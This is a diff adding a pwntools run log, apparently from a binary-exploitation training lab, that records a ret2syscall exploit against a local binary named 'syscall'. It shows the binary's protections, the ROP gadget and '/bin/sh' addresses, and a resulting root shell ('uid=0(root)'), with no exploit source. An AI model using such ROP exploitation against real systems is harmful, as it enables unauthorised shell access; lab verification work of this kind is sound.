@@ -1,0 +1,31 @@
+[*] '/root/techlabs/verify-pwn-b/6.3/syscall'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[x] Starting local process './syscall'
+[+] Starting local process './syscall': pid 428716
+[*] Loaded 53 cached gadgets for './syscall'
+[*] pop rax  = 0x401885
+[*] pop rdi  = 0x401887
+[*] pop rsi  = 0x401889
+[*] pop rdx  = 0x40188b
+[*] syscall  = 0x4012a4
+[*] /bin/sh  = 0x4aa0d0
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 8B
+[x] Receiving all data: 25B
+[x] Receiving all data: 64B
+[x] Receiving all data: 74B
+[*] Process './syscall' stopped with exit code 0 (pid 428716)
+[+] Receiving all data: Done (74B)
+/bin/sh
+===PWNED_6_3M===
+uid=0(root) gid=0(root) groups=0(root)
+===END===
+
+[+] ret2syscall (tay) OK
